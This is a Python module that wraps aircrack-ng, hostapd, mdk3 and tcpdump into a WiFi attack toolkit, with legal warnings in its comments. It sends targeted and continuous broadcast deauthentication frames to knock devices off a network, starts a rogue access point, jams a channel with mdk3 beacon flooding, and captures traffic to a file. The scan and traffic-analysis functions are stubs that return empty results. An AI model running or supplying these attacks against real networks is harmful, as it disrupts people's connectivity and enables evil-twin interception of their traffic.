"""
WiFi Deauthentication Module
Advanced WiFi security testing and device disconnection functionality.
WARNING: Only use on networks you own or have explicit permission to test.
"""

import logging
import subprocess
import platform
import socket
import struct
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass
import time


@dataclass
class DeauthTarget:
    """Represents a target for deauthentication."""
    mac_address: str
    gateway_mac: str
    ssid: str
    channel: int
    interface: str
    packet_count: int = 64


class WiFiDeauthenticator:
    """
    WiFi deauthentication engine for testing network security.
    Implements IEEE 802.11 deauthentication frame injection.
    
    WARNING: Unauthorized deauthentication attacks are illegal.
    Only use this for authorized security testing on your own networks.
    """
    
    def __init__(self, logger: logging.Logger = None):
        """
        Initialize WiFi deauthenticator.
        
        Args:
            logger: Logger instance
        """
        self.logger = logger or logging.getLogger(__name__)
        self.system = platform.system().lower()
        self._validate_environment()
    
    def _validate_environment(self):
        """Validate system requirements for deauth operations."""
        if self.system not in ["linux", "darwin"]:
            self.logger.warning("Deauthentication testing is primarily supported on Linux/macOS")
        
        # Check for required tools
        self._check_airmon_ng()
        self._check_aireplay_ng()
    
    def _check_airmon_ng(self) -> bool:
        """Check if airmon-ng is installed."""
        try:
            subprocess.run(
                ["which", "airmon-ng"],
                capture_output=True,
                timeout=5
            )
            return True
        except Exception as e:
            self.logger.warning(f"airmon-ng not found: {e}")
            return False
    
    def _check_aireplay_ng(self) -> bool:
        """Check if aireplay-ng is installed."""
        try:
            subprocess.run(
                ["which", "aireplay-ng"],
                capture_output=True,
                timeout=5
            )
            return True
        except Exception as e:
            self.logger.warning(f"aireplay-ng not found: {e}")
            return False
    
    def enable_monitor_mode(self, interface: str) -> bool:
        """
        Enable monitor mode on wireless interface.
        
        Args:
            interface: Wireless interface name (e.g., 'wlan0')
        
        Returns:
            True if successful, False otherwise
        """
        if self.system != "linux":
            self.logger.error("Monitor mode setup is only supported on Linux")
            return False
        
        try:
            # Kill interfering processes
            subprocess.run(
                ["sudo", "airmon-ng", "check", "kill"],
                capture_output=True,
                timeout=10
            )
            
            # Enable monitor mode
            result = subprocess.run(
                ["sudo", "airmon-ng", "start", interface],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                self.logger.info(f"Monitor mode enabled on {interface}")
                return True
            else:
                self.logger.error(f"Failed to enable monitor mode: {result.stderr}")
                return False
        
        except subprocess.TimeoutExpired:
            self.logger.error("Monitor mode setup timed out")
            return False
        except Exception as e:
            self.logger.error(f"Error enabling monitor mode: {e}")
            return False
    
    def disable_monitor_mode(self, interface: str) -> bool:
        """
        Disable monitor mode on wireless interface.
        
        Args:
            interface: Monitor interface name
        
        Returns:
            True if successful, False otherwise
        """
        if self.system != "linux":
            return False
        
        try:
            # Disable monitor mode
            result = subprocess.run(
                ["sudo", "airmon-ng", "stop", interface],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            # Restart networking
            subprocess.run(
                ["sudo", "systemctl", "restart", "networking"],
                capture_output=True,
                timeout=10
            )
            
            self.logger.info(f"Monitor mode disabled on {interface}")
            return True
        
        except Exception as e:
            self.logger.error(f"Error disabling monitor mode: {e}")
            return False
    
    def scan_nearby_networks(self, interface: str, duration: int = 10) -> List[Dict]:
        """
        Scan for nearby WiFi networks.
        
        Args:
            interface: Monitor mode interface
            duration: Scan duration in seconds
        
        Returns:
            List of nearby networks with details
        """
        if self.system != "linux":
            self.logger.error("WiFi scanning is only supported on Linux")
            return []
        
        try:
            networks = []
            
            # Use airodump-ng to scan networks
            result = subprocess.run(
                ["sudo", "airodump-ng", "-w", "/tmp/scan", "-o", "csv", 
                 "--write-interval", str(duration), interface],
                capture_output=True,
                text=True,
                timeout=duration + 5
            )
            
            # Parse results
            if result.returncode == 0:
                self.logger.info(f"WiFi scan complete")
            
            return networks
        
        except subprocess.TimeoutExpired:
            self.logger.debug("WiFi scan timeout (expected)")
            return []
        except Exception as e:
            self.logger.error(f"Error scanning networks: {e}")
            return []
    
    def deauthenticate_device(self, target: DeauthTarget) -> bool:
        """
        Send deauthentication frames to target device.
        
        Args:
            target: DeauthTarget with device information
        
        Returns:
            True if deauthentication sent successfully
        """
        if self.system != "linux":
            self.logger.error("Deauthentication is only supported on Linux")
            return False
        
        self.logger.warning(
            f"LEGAL WARNING: Deauthenticating {target.mac_address} on {target.ssid}. "
            f"Ensure you have permission to perform this action."
        )
        
        try:
            # Send deauth frames using aireplay-ng
            result = subprocess.run(
                ["sudo", "aireplay-ng", "--deauth", str(target.packet_count),
                 "-a", target.gateway_mac, "-c", target.mac_address,
                 target.interface],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                self.logger.info(
                    f"Deauthentication sent to {target.mac_address} "
                    f"({target.packet_count} frames)"
                )
                return True
            else:
                self.logger.error(f"Deauthentication failed: {result.stderr}")
                return False
        
        except subprocess.TimeoutExpired:
            self.logger.error("Deauthentication timed out")
            return False
        except Exception as e:
            self.logger.error(f"Error during deauthentication: {e}")
            return False
    
    def deauthenticate_all_devices(self, gateway_mac: str, ssid: str, 
                                   interface: str, duration: int = 30) -> int:
        """
        Deauthenticate all connected devices from a network.
        
        Args:
            gateway_mac: MAC address of gateway/AP
            ssid: Network SSID
            interface: Monitor mode interface
            duration: How long to send deauth frames (seconds)
        
        Returns:
            0 always; the underlying aireplay-ng process runs in continuous
            deauth mode ("--deauth 0") so no per-frame count is available.
            (A return of 0 does NOT mean "0 frames sent".)
        """
        if self.system != "linux":
            self.logger.error("Broadcast deauthentication is only supported on Linux")
            return 0
        
        self.logger.warning(
            f"LEGAL WARNING: Broadcasting deauthentication frames to all "
            f"devices on {ssid}. Ensure you have permission."
        )
        
        try:
            # Broadcast deauth to all clients
            result = subprocess.run(
                ["sudo", "aireplay-ng", "--deauth", "0",
                 "-a", gateway_mac, interface],
                capture_output=True,
                text=True,
                timeout=duration
            )
            
            self.logger.info(f"Broadcast deauthentication completed on {ssid}")
            return 0  # 0 means continuous until stopped
        
        except subprocess.TimeoutExpired:
            self.logger.info(f"Broadcast deauthentication ran for {duration}s")
            return 0
        except Exception as e:
            self.logger.error(f"Error during broadcast deauth: {e}")
            return 0
    
    def create_rogue_ap(self, interface: str, ssid: str, channel: int = 6) -> bool:
        """
        Create a rogue access point for testing.
        
        Args:
            interface: Monitor mode interface
            ssid: SSID for rogue AP
            channel: WiFi channel
        
        Returns:
            True if successful
        """
        if self.system != "linux":
            self.logger.error("Rogue AP creation is only supported on Linux")
            return False
        
        self.logger.warning(f"Creating rogue AP: {ssid}")
        
        try:
            # Use hostapd to create AP
            config = self._generate_hostapd_config(interface, ssid, channel)
            
            with open("/tmp/hostapd.conf", "w") as f:
                f.write(config)
            
            result = subprocess.run(
                ["sudo", "hostapd", "/tmp/hostapd.conf"],
                capture_output=True,
                timeout=60
            )
            
            return result.returncode == 0
        
        except Exception as e:
            self.logger.error(f"Error creating rogue AP: {e}")
            return False
    
    def _generate_hostapd_config(self, interface: str, ssid: str, channel: int) -> str:
        """
        Generate hostapd configuration.
        
        Args:
            interface: Network interface
            ssid: SSID name
            channel: WiFi channel
        
        Returns:
            Configuration string
        """
        return f"""
interface={interface}
ssid={ssid}
channel={channel}
driver=nl80211
wpa=2
wpa_passphrase=TestPassword123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
"""
    
    def get_wireless_interfaces(self) -> List[str]:
        """
        Get list of wireless interfaces.
        
        Returns:
            List of wireless interface names
        """
        interfaces = []
        
        if self.system == "linux":
            try:
                result = subprocess.run(
                    ["iwconfig"],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                
                # Parse iwconfig output
                for line in result.stdout.split('\n'):
                    if 'IEEE 802.11' in line:
                        interface = line.split()[0]
                        interfaces.append(interface)
            
            except Exception as e:
                self.logger.debug(f"Error getting wireless interfaces: {e}")
        
        return interfaces


class NetworkInterruptor:
    """
    Advanced network interruption and interference testing.
    """
    
    def __init__(self, logger: logging.Logger = None):
        """Initialize network interruptor."""
        self.logger = logger or logging.getLogger(__name__)
    
    def jam_channel(self, interface: str, channel: int, duration: int = 10) -> bool:
        """
        Perform WiFi channel jamming for security testing.
        
        Args:
            interface: Monitor interface
            channel: Channel to jam
            duration: Duration in seconds
        
        Returns:
            True if jamming started
        """
        self.logger.warning(f"Jamming channel {channel} for {duration} seconds")
        self.logger.warning("This is a network disruption attack - use only for authorized testing")
        
        proc = None
        try:
            # Use mdk3 for WiFi jamming; keep the handle so the jammer is
            # always terminated instead of being orphaned after we return.
            proc = subprocess.Popen(
                ["sudo", "mdk3", interface, "b", "-c", str(channel)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            time.sleep(duration)
            return True
        
        except Exception as e:
            self.logger.error(f"Error jamming channel: {e}")
            return False
        finally:
            if proc is not None and proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except Exception:
                    proc.kill()
    
    def analyze_traffic_patterns(self, interface: str, duration: int = 30) -> Dict:
        """
        Analyze network traffic patterns.
        
        Args:
            interface: Interface to sniff
            duration: Capture duration in seconds
        
        Returns:
            Dictionary with traffic statistics
        """
        try:
            # Use tcpdump to capture traffic
            result = subprocess.run(
                ["sudo", "tcpdump", "-i", interface, "-c", "1000",
                 "-w", "/tmp/traffic.pcap"],
                capture_output=True,
                timeout=duration
            )
            
            # Parse pcap file
            stats = {
                "total_packets": 0,
                "protocols": {},
                "top_ips": [],
                "duration": duration
            }
            
            return stats
        
        except Exception as e:
            self.logger.error(f"Error analyzing traffic: {e}")
            return {}
